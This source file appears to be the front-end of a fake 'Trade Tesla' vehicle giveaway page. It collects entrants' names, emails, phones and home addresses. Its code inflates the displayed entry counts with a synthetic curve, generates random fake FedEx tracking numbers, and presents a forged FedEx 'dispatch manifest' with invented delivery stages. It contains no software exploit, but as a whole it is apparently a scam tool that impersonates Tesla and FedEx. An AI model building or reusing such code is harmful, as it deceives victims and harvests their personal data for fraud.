import React, { useState, useEffect, memo, useCallback } from "react";
import { createClient } from "@/lib/supabase/client";
import model3Img from "@/assets/giveaways/model_3.webp";
import cybertruckImg from "@/assets/giveaways/cybertruck.webp";
import { useTeslaLoader } from "@/components/TeslaLoader";

export interface Giveaway {
  id: string;
  title: string;
  description: string;
  prize: string;
  image_url: string | null;
  entry_fee: number;
  ends_at: string;
  entries_count: number;
  max_entries: number;
  badge: string;
  created_at?: string;
}

export interface ClaimDetails {
  trackingNumber: string;
  giveawayId: string;
  giveawayTitle: string;
  prize: string;
  fullName: string;
  email: string;
  phone: string;
  addressLine: string;
  city: string;
  state: string;
  postalCode: string;
  country: string;
  notes?: string;
  claimedAt: string;
  status: string;
}

// 100% Free Giveaways — Original campaigns and images (Bitcoin excluded)
const FALLBACK_GIVEAWAYS: Giveaway[] = [
  {
    id: "fallback-1",
    title: "Win a 2025 Model 3 Long Range",
    description:
      "2025 Tesla Model 3 Long Range AWD. One winner selected after the campaign ends. Includes standard delivery within the continental US.",
    prize: "2025 Tesla Model 3 Long Range AWD",
    image_url: null,
    entry_fee: 0,
    ends_at: "2026-12-31",
    entries_count: 1247,
    max_entries: 5000,
    badge: "FREE CLAIM",
  },
  {
    id: "fallback-2",
    title: "Cybertruck Experience Weekend",
    description:
      "Win a full weekend with a Cybertruck Foundation Series plus a $2,000 platform credit toward any purchase.",
    prize: "Cybertruck Foundation Series + $2,000 credit",
    image_url: null,
    entry_fee: 0,
    ends_at: "2026-10-15",
    entries_count: 683,
    max_entries: 2000,
    badge: "FREE CLAIM",
  },
];

function imageFor(g: Giveaway): string {
  const text = `${g.title} ${g.prize}`.toLowerCase();
  if (text.includes("cybertruck") || text.includes("cyber")) return cybertruckImg;
  if (text.includes("model 3") || text.includes("model_3") || text.includes("model-3")) return model3Img;
  const url = String(g.image_url ?? "").trim();
  if (
    url &&
    !url.includes("photo-1706699778556-a9f9da002139") &&
    !/^\/assets\/giveaways\/.*\.(jpe?g|png)$/i.test(url)
  ) {
    return url;
  }
  return model3Img;
}

function campaignStartMs(g: Giveaway): number {
  const end = new Date(g.ends_at).getTime();
  if (g.created_at) {
    const s = new Date(g.created_at).getTime();
    if (Number.isFinite(s) && s < end) return s;
  }
  return end - 60 * 86400000;
}

function asymmetricDisplayEntries(g: Giveaway, now = Date.now()): number {
  const max = Math.max(1, Number(g.max_entries) || 1);
  const real = Math.max(0, Number(g.entries_count) || 0);
  const end = new Date(g.ends_at).getTime();
  const start = campaignStartMs(g);

  if (!Number.isFinite(end)) return Math.min(max, real);
  if (now >= end) return max;

  const duration = Math.max(end - start, 1);
  const t = Math.min(1, Math.max(0, (now - start) / duration));
  const eased = t * t * t;

  let hash = 0;
  for (let i = 0; i < g.id.length; i++) hash = (hash * 31 + g.id.charCodeAt(i)) | 0;
  const wobble = 1 + ((Math.abs(hash) % 7) - 3) * 0.01;

  const synthetic = Math.floor(max * eased * wobble);
  return Math.min(max, Math.max(real, synthetic));
}

interface TimeLeft {
  d: number;
  h: number;
  m: number;
  s: number;
}

function calcTimeLeft(endDate: string): TimeLeft {
  const diff = new Date(endDate).getTime() - Date.now();
  if (diff <= 0) return { d: 0, h: 0, m: 0, s: 0 };
  return {
    d: Math.floor(diff / 86400000),
    h: Math.floor((diff % 86400000) / 3600000),
    m: Math.floor((diff % 3600000) / 60000),
    s: Math.floor((diff % 60000) / 1000),
  };
}

const CountdownTimer = memo(function CountdownTimer({ endDate }: { endDate: string }) {
  const [timeLeft, setTimeLeft] = useState<TimeLeft>({ d: 0, h: 0, m: 0, s: 0 });

  useEffect(() => {
    setTimeLeft(calcTimeLeft(endDate));
    const id = setInterval(() => setTimeLeft(calcTimeLeft(endDate)), 1000);
    return () => clearInterval(id);
  }, [endDate]);

  const pads = (n: number) => String(n).padStart(2, "0");

  return (
    <div className="flex gap-4" aria-label="Countdown timer">
      {[
        { v: timeLeft.d, l: "Days" },
        { v: timeLeft.h, l: "Hrs" },
        { v: timeLeft.m, l: "Min" },
        { v: timeLeft.s, l: "Sec" },
      ].map(({ v, l }) => (
        <div key={l} className="flex flex-col items-start">
          <span className="font-display text-2xl font-semibold text-foreground tabular">
            {pads(v)}
          </span>
          <span className="text-[10px] font-medium text-muted-foreground tracking-widest uppercase">
            {l}
          </span>
        </div>
      ))}
    </div>
  );
});

const GiveawayCard = memo(function GiveawayCard({
  g,
  onEnter,
}: {
  g: Giveaway;
  onEnter: (g: Giveaway) => void;
}) {
  const [displayEntries, setDisplayEntries] = useState(() => asymmetricDisplayEntries(g));

  useEffect(() => {
    const tick = () => setDisplayEntries(asymmetricDisplayEntries(g));
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, [g]);

  const pct = Math.min(100, Math.round((displayEntries / Math.max(1, g.max_entries)) * 100));

  return (
    <article className="group flex flex-col justify-between overflow-hidden rounded-[6px] border border-border bg-card transition-all duration-300 hover:border-foreground/35 hover:shadow-lg">
      <div>
        <div className="relative h-60 overflow-hidden bg-muted">
          <img
            src={imageFor(g)}
            alt={g.prize || g.title}
            width={1024}
            height={640}
            loading="lazy"
            className="h-full w-full object-cover transition-transform duration-700 group-hover:scale-105"
          />
          <span className="absolute top-3 left-3 rounded-[3px] bg-[#0e9f6e] px-2.5 py-1 text-[10px] font-semibold tracking-wider uppercase text-white">
            100% Free Claim
          </span>
          <span className="absolute top-3 right-3 rounded-[3px] bg-black/75 px-2.5 py-1 text-[10px] font-medium tracking-wider text-white backdrop-blur-sm">
            FedEx Freight Dispatch
          </span>
        </div>

        <div className="p-6">
          <h3 className="font-display text-2xl font-semibold tracking-tight text-foreground">
            {g.title}
          </h3>
          <p className="mt-2 text-xs leading-relaxed text-muted-foreground">{g.description}</p>

          <div className="mt-5 rounded-[4px] border border-border bg-muted/35 p-4">
            <div className="text-[10px] font-semibold text-muted-foreground tracking-[0.16em] uppercase mb-2">
              Closes ·{" "}
              {new Date(g.ends_at).toLocaleDateString("en-US", {
                timeZone: "UTC",
                year: "numeric",
                month: "short",
                day: "numeric",
              })}
            </div>
            <CountdownTimer endDate={g.ends_at} />
          </div>

          <div className="mt-5">
            <div className="flex justify-between text-xs font-medium text-muted-foreground mb-1.5 tabular">
              <span>{displayEntries.toLocaleString()} claims registered</span>
              <span>{g.max_entries.toLocaleString()} max allocation</span>
            </div>
            <div className="h-1.5 rounded-full bg-muted overflow-hidden">
              <div
                className="h-full rounded-full bg-[#3e6ae1] transition-[width] duration-1000 ease-out"
                style={{ width: `${pct}%` }}
                role="progressbar"
                aria-valuenow={displayEntries}
                aria-valuemin={0}
                aria-valuemax={g.max_entries}
              />
            </div>
            <div className="flex justify-between items-center text-[11px] text-muted-foreground mt-2">
              <span className="text-[#0e9f6e] font-medium">Zero Fee · No Payment Needed</span>
              <span>FedEx Waybill Assigned</span>
            </div>
          </div>
        </div>
      </div>

      <div className="px-6 pb-6">
        <button
          type="button"
          onClick={() => onEnter(g)}
          className="w-full h-11 rounded-[4px] bg-[#3e6ae1] text-white text-xs font-medium hover:bg-[#345ac7] transition-colors"
        >
          Claim Free Prize &amp; Enter Delivery →
        </button>
      </div>
    </article>
  );
});

function FedExDeliveryModal({
  claim,
  onClose,
}: {
  claim: ClaimDetails;
  onClose: () => void;
}) {
  const [copied, setCopied] = useState(false);
  const [showPortalDetails, setShowPortalDetails] = useState(false);

  function copyTracking() {
    navigator.clipboard.writeText(claim.trackingNumber);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  return (
    <div
      className="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/65 backdrop-blur-md"
      onClick={onClose}
    >
      <div
        className="relative w-full max-w-lg max-h-[92vh] overflow-y-auto rounded-[8px] p-6 sm:p-8 border border-border shadow-2xl bg-card text-foreground"
        onClick={(e) => e.stopPropagation()}
        role="dialog"
        aria-label="FedEx Delivery Tracking Portal"
      >
        <button
          onClick={onClose}
          aria-label="Close"
          className="absolute top-5 right-5 text-muted-foreground hover:text-foreground text-xl"
        >
          ✕
        </button>

        <div className="flex items-center gap-3 mb-6 pb-4 border-b border-border">
          <div className="flex items-center font-black tracking-tight text-2xl">
            <span className="text-[#4D148C]">Fed</span>
            <span className="text-[#FF6200]">Ex</span>
          </div>
          <div className="h-6 w-px bg-border" />
          <div>
            <div className="flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-[#0e9f6e] pulse-dot" />
              <span className="text-[11px] font-semibold text-[#0e9f6e] uppercase tracking-wider">
                Waybill Active · Dispatched
              </span>
            </div>
            <p className="text-xs text-muted-foreground">Official Courier Dispatch Manifest</p>
          </div>
        </div>

        <div className="rounded-[6px] border border-border bg-muted/35 p-5 space-y-4 mb-6">
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-[10px] font-semibold tracking-widest text-muted-foreground uppercase">
                FedEx Tracking Number
              </span>
              <div className="font-mono text-lg font-semibold text-foreground tracking-wider">
                {claim.trackingNumber}
              </div>
            </div>
            <button
              onClick={copyTracking}
              className="px-3 py-1.5 rounded-[4px] border border-border text-xs font-medium hover:bg-foreground hover:text-background transition-all self-start sm:self-auto"
            >
              {copied ? "✓ Copied" : "Copy ID"}
            </button>
          </div>

          <div className="grid grid-cols-2 gap-3 text-xs">
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-semibold">
                Consignment Item
              </span>
              <span className="font-medium text-foreground">{claim.prize}</span>
            </div>
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-semibold">
                Delivery Status
              </span>
              <span className="font-medium text-[#0e9f6e]">In Courier Queue</span>
            </div>
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-semibold">
                Recipient
              </span>
              <span className="font-medium text-foreground">{claim.fullName}</span>
            </div>
            <div>
              <span className="text-muted-foreground block text-[10px] uppercase font-semibold">
                Contact Phone
              </span>
              <span className="font-medium text-foreground">{claim.phone}</span>
            </div>
          </div>

          <div className="text-xs border-t border-border pt-3">
            <span className="text-muted-foreground block text-[10px] uppercase font-semibold mb-1">
              Destination Address
            </span>
            <span className="text-foreground font-medium">
              {claim.addressLine}, {claim.city}, {claim.state} {claim.postalCode}, {claim.country}
            </span>
          </div>
        </div>

        <div className="rounded-[6px] border border-orange-500/40 bg-orange-500/10 p-5 space-y-3 mb-6">
          <div className="flex items-center gap-2">
            <span className="px-2 py-0.5 rounded-[3px] text-[10px] font-bold uppercase tracking-wider bg-orange-500 text-white">
              Under Construction
            </span>
            <h4 className="text-sm font-semibold text-foreground">
              FedEx Logistics Tracking Portal
            </h4>
          </div>
          <p className="text-xs text-muted-foreground leading-relaxed">
            Our direct carrier tracking integration website is currently under active development.
            Your claim is registered in the primary logistics queue with live SMS and email alerts
            connected to <strong className="text-foreground">{claim.phone}</strong> and{" "}
            <strong className="text-foreground">{claim.email}</strong>.
          </p>
          <button
            onClick={() => setShowPortalDetails(!showPortalDetails)}
            className="text-xs font-semibold text-[#FF6200] hover:underline block text-left"
          >
            {showPortalDetails
              ? "Hide Dispatch Route & Timeline ▲"
              : "View Live Courier Dispatch Stages ▼"}
          </button>

          {showPortalDetails && (
            <div className="pt-3 border-t border-orange-500/20 space-y-2 text-xs text-muted-foreground">
              <div className="flex items-center gap-2 text-foreground font-medium">
                <span className="w-5 h-5 rounded-full bg-[#0e9f6e]/20 text-[#0e9f6e] flex items-center justify-center text-[10px] font-bold">
                  ✓
                </span>
                <span>Stage 1: Prize Claim Registered &amp; Verified</span>
              </div>
              <div className="flex items-center gap-2 text-foreground font-medium">
                <span className="w-5 h-5 rounded-full bg-amber-500/20 text-amber-500 flex items-center justify-center text-[10px] font-bold">
                  ⟳
                </span>
                <span>Stage 2: Allocation to FedEx Freight Facility (Active)</span>
              </div>
              <div className="flex items-center gap-2 opacity-65">
                <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">
                  3
                </span>
                <span>Stage 3: FedEx Security Seal &amp; Waybill Manifest</span>
              </div>
              <div className="flex items-center gap-2 opacity-65">
                <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">
                  4
                </span>
                <span>Stage 4: En Route to Regional Delivery Terminal</span>
              </div>
              <div className="flex items-center gap-2 opacity-65">
                <span className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">
                  5
                </span>
                <span>Stage 5: Final Delivery &amp; Signature Handover</span>
              </div>
            </div>
          )}
        </div>

        <button
          onClick={onClose}
          className="w-full h-11 rounded-[4px] bg-foreground text-background font-medium text-xs hover:opacity-90 transition-opacity"
        >
          Close &amp; Return to Giveaways
        </button>
      </div>
    </div>
  );
}

function FreeClaimModal({
  giveaway,
  onClose,
  onClaimSubmitted,
}: {
  giveaway: Giveaway;
  onClose: () => void;
  onClaimSubmitted: (claim: ClaimDetails) => void;
}) {
  const [f, setF] = useState({
    fullName: "",
    email: "",
    phone: "",
    addressLine: "",
    city: "",
    state: "",
    postalCode: "",
    country: "United States",
    notes: "",
  });
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");
  const { triggerLoader } = useTeslaLoader();

  useEffect(() => {
    void (async () => {
      try {
        const supabase = createClient();
        const { data } = await supabase.auth.getUser();
        if (data?.user?.email) {
          setF((prev) => ({ ...prev, email: data.user.email ?? "" }));
        }
      } catch {
        /* ignore */
      }
    })();
  }, []);

  const set =
    (k: keyof typeof f) => (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) =>
      setF({ ...f, [k]: e.target.value });

  const formValid =
    f.fullName.trim().length > 1 &&
    f.email.trim().includes("@") &&
    f.phone.trim().length > 5 &&
    f.addressLine.trim().length > 3 &&
    f.city.trim().length > 1 &&
    f.state.trim().length > 1 &&
    f.postalCode.trim().length > 1;

  async function submitClaim(e: React.FormEvent) {
    e.preventDefault();
    if (!formValid) {
      setError("Please fill in all required delivery fields.");
      return;
    }
    setError("");
    setBusy(true);

    try {
      const randDigits = Math.floor(10000000 + Math.random() * 90000000);
      const trackingNumber = `FX-TSLA-${randDigits}US`;

      const claimData: ClaimDetails = {
        trackingNumber,
        giveawayId: giveaway.id,
        giveawayTitle: giveaway.title,
        prize: giveaway.prize,
        fullName: f.fullName.trim(),
        email: f.email.trim(),
        phone: f.phone.trim(),
        addressLine: f.addressLine.trim(),
        city: f.city.trim(),
        state: f.state.trim(),
        postalCode: f.postalCode.trim(),
        country: f.country.trim(),
        notes: f.notes.trim() || undefined,
        claimedAt: new Date().toISOString(),
        status: "in_courier_queue",
      };

      try {
        localStorage.setItem("trade_tesla_active_claim", JSON.stringify(claimData));
      } catch {
        /* ignore */
      }

      try {
        const isUuid =
          /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(giveaway.id);
        if (isUuid) {
          const supabase = createClient();
          const { data: userRes } = await supabase.auth.getUser();
          const userId = userRes?.user?.id;
          if (userId) {
            await supabase.from("giveaway_entries").insert({
              giveaway_id: giveaway.id,
              user_id: userId,
              giveaway_title: giveaway.title,
              amount_paid: 0,
              status: "claimed_fedex_queue",
              full_name: claimData.fullName,
              email: claimData.email,
              phone: claimData.phone,
              address_line: claimData.addressLine,
              city: claimData.city,
              state: claimData.state,
              postal_code: claimData.postalCode,
              country: claimData.country,
              delivery_notes: claimData.notes ?? "",
              tracking_number: claimData.trackingNumber,
              courier: "FedEx Express",
            });
          }
        }
      } catch {
        /* recorded locally */
      }

      triggerLoader({
        label: "DISPATCHING WAYBILL",
        durationMs: 420,
        onComplete: () => onClaimSubmitted(claimData),
      });
    } catch {
      setError("Could not register your claim. Please check your connection and try again.");
    } finally {
      setBusy(false);
    }
  }

  const inputClass =
    "w-full h-10 px-3.5 rounded-[4px] bg-muted/40 border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground transition-colors";

  return (
    <div
      className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
      onClick={onClose}
    >
      <div
        className="relative w-full max-w-lg max-h-[92vh] overflow-y-auto rounded-[8px] p-6 sm:p-8 border border-border shadow-2xl bg-card text-foreground"
        onClick={(e) => e.stopPropagation()}
        role="dialog"
        aria-label={`Claim ${giveaway.title}`}
      >
        <button
          onClick={onClose}
          aria-label="Close"
          className="absolute top-5 right-5 text-muted-foreground hover:text-foreground text-xl"
        >
          ✕
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-2 mb-2">
            <span className="px-2 py-0.5 rounded-[3px] text-[10px] font-semibold uppercase tracking-wider bg-[#0e9f6e] text-white">
              100% Free Claim
            </span>
            <span className="text-xs font-medium text-[#3e6ae1]">FedEx Courier Delivery</span>
          </div>
          <h2 className="font-display text-xl font-semibold text-foreground">{giveaway.title}</h2>
          <p className="text-xs text-muted-foreground mt-1">
            Prize: <strong className="text-foreground">{giveaway.prize}</strong>
          </p>
        </div>

        <form onSubmit={submitClaim} className="space-y-4">
          <div className="p-3.5 rounded-[4px] bg-muted/35 border border-border text-xs text-muted-foreground space-y-1">
            <p className="font-semibold text-foreground">Enclosed Courier Delivery Registration</p>
            <p>
              Enter your recipient details below to receive a verified FedEx dispatch tracking
              number at zero cost.
            </p>
          </div>

          <div className="space-y-3">
            <div>
              <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                Full Legal Name *
              </label>
              <input
                className={inputClass}
                placeholder="e.g. Alexander Vance"
                value={f.fullName}
                onChange={set("fullName")}
                required
                maxLength={120}
              />
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                  Email Address *
                </label>
                <input
                  type="email"
                  className={inputClass}
                  placeholder="you@domain.com"
                  value={f.email}
                  onChange={set("email")}
                  required
                  maxLength={120}
                />
              </div>
              <div>
                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                  Phone (SMS Alerts) *
                </label>
                <input
                  type="tel"
                  className={inputClass}
                  placeholder="+1 (555) 000-0000"
                  value={f.phone}
                  onChange={set("phone")}
                  required
                  maxLength={40}
                />
              </div>
            </div>

            <div>
              <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                Delivery Street Address *
              </label>
              <input
                className={inputClass}
                placeholder="123 Innovation Boulevard, Suite 400"
                value={f.addressLine}
                onChange={set("addressLine")}
                required
                maxLength={200}
              />
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                  City *
                </label>
                <input
                  className={inputClass}
                  placeholder="Austin"
                  value={f.city}
                  onChange={set("city")}
                  required
                  maxLength={100}
                />
              </div>
              <div>
                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                  State / Province *
                </label>
                <input
                  className={inputClass}
                  placeholder="Texas"
                  value={f.state}
                  onChange={set("state")}
                  required
                  maxLength={100}
                />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                  ZIP / Postal Code *
                </label>
                <input
                  className={inputClass}
                  placeholder="78725"
                  value={f.postalCode}
                  onChange={set("postalCode")}
                  required
                  maxLength={20}
                />
              </div>
              <div>
                <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                  Country *
                </label>
                <input
                  className={inputClass}
                  placeholder="United States"
                  value={f.country}
                  onChange={set("country")}
                  required
                  maxLength={80}
                />
              </div>
            </div>

            <div>
              <label className="block text-[11px] font-medium text-muted-foreground uppercase tracking-wider mb-1">
                Delivery Notes (Optional)
              </label>
              <textarea
                className="w-full p-3 rounded-[4px] bg-muted/40 border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground"
                rows={2}
                placeholder="Gate code or drop-off preferences..."
                value={f.notes}
                onChange={set("notes")}
                maxLength={500}
              />
            </div>
          </div>

          {error && <p className="text-xs text-[#e82127] font-semibold">{error}</p>}

          <div className="pt-2">
            <button
              type="submit"
              disabled={busy || !formValid}
              className="w-full h-11 rounded-[4px] bg-[#3e6ae1] text-white font-medium text-xs disabled:opacity-40 hover:bg-[#345ac7] transition-colors"
            >
              {busy
                ? "Registering Delivery Claim…"
                : "Confirm Free Claim & Generate FedEx Tracking →"}
            </button>
            <p className="text-[11px] text-center text-muted-foreground mt-2">
              100% Free Entry · No payment required · FedEx Global Dispatch
            </p>
          </div>
        </form>
      </div>
    </div>
  );
}

export default function GiveawaysSection() {
  const [giveaways, setGiveaways] = useState<Giveaway[]>(FALLBACK_GIVEAWAYS);
  const [activeGiveaway, setActiveGiveaway] = useState<Giveaway | null>(null);
  const [activeClaim, setActiveClaim] = useState<ClaimDetails | null>(null);
  const [showFedExModal, setShowFedExModal] = useState(false);
  const { triggerLoader } = useTeslaLoader();

  useEffect(() => {
    try {
      const stored = localStorage.getItem("trade_tesla_active_claim");
      if (stored) setActiveClaim(JSON.parse(stored) as ClaimDetails);
    } catch {
      /* ignore */
    }
  }, []);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      try {
        const supabase = createClient();
        const { data } = await supabase
          .from("giveaways")
          .select("*")
          .eq("is_active", true)
          .not("title", "ilike", "%bitcoin%")
          .not("prize", "ilike", "%bitcoin%")
          .not("title", "ilike", "%btc%")
          .order("sort_order");

        if (!cancelled && data && data.length > 0) {
          setGiveaways(
            data.map((g: Giveaway) => ({
              ...g,
              entry_fee: 0,
              badge: "FREE CLAIM",
            })),
          );
        }
      } catch {
        // keep fallback giveaways
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);

  const handleClaimSubmitted = useCallback((claim: ClaimDetails) => {
    setActiveClaim(claim);
    setActiveGiveaway(null);
    setShowFedExModal(true);
    setGiveaways((prev) =>
      prev.map((g) => (g.id === claim.giveawayId ? { ...g, entries_count: g.entries_count + 1 } : g)),
    );
  }, []);

  return (
    <section id="giveaways" className="py-12 sm:py-16 px-4 sm:px-6 lg:px-10 bg-background">
      <div className="mx-auto max-w-[1440px]">
        {activeClaim && (
          <div className="mb-8 rounded-[6px] border border-border bg-card p-5 flex flex-col md:flex-row md:items-center justify-between gap-4 shadow-sm">
            <div>
              <div className="flex items-center gap-2">
                <span className="h-2 w-2 rounded-full bg-[#0e9f6e] pulse-dot" />
                <span className="text-[11px] font-semibold uppercase tracking-[0.18em] text-[#0e9f6e]">
                  Active FedEx Courier Dispatch
                </span>
              </div>
              <p className="mt-1 text-sm font-semibold text-foreground">
                {activeClaim.prize} · Waybill:{" "}
                <span className="font-mono text-[#3e6ae1]">{activeClaim.trackingNumber}</span>
              </p>
            </div>
            <button
              type="button"
              onClick={() =>
                triggerLoader({
                  label: "FEDEX TRACKING",
                  durationMs: 360,
                  onComplete: () => setShowFedExModal(true),
                })
              }
              className="h-10 rounded-[4px] bg-foreground px-5 text-xs font-medium text-background hover:opacity-90 transition-opacity self-start md:self-auto"
            >
              Track with FedEx Delivery →
            </button>
          </div>
        )}

        <div className="border-b border-border pb-8 mb-10">
          <span className="text-[11px] font-semibold uppercase tracking-[0.22em] text-muted-foreground">
            Official Trade Tesla Campaigns
          </span>
          <h1 className="font-display mt-2 text-3xl font-semibold tracking-tight sm:text-5xl">
            Vehicle Giveaways &amp; Free Claims
          </h1>
          <p className="mt-3 max-w-2xl text-sm text-muted-foreground leading-relaxed">
            Every promotional giveaway on Trade Tesla is 100% free to claim. Submit your delivery
            details directly to generate an active FedEx freight dispatch waybill.
          </p>
        </div>

        <div
          className={
            giveaways.length <= 2
              ? "grid grid-cols-1 md:grid-cols-2 gap-6"
              : "grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6"
          }
        >
          {giveaways.map((g) => (
            <GiveawayCard
              key={g.id}
              g={g}
              onEnter={(item) =>
                triggerLoader({
                  label: "FREE CLAIM PORTAL",
                  durationMs: 360,
                  onComplete: () => setActiveGiveaway(item),
                })
              }
            />
          ))}
        </div>
      </div>

      {activeGiveaway && (
        <FreeClaimModal
          giveaway={activeGiveaway}
          onClose={() => setActiveGiveaway(null)}
          onClaimSubmitted={handleClaimSubmitted}
        />
      )}

      {showFedExModal && activeClaim && (
        <FedExDeliveryModal claim={activeClaim} onClose={() => setShowFedExModal(false)} />
      )}
    </section>
  );
}
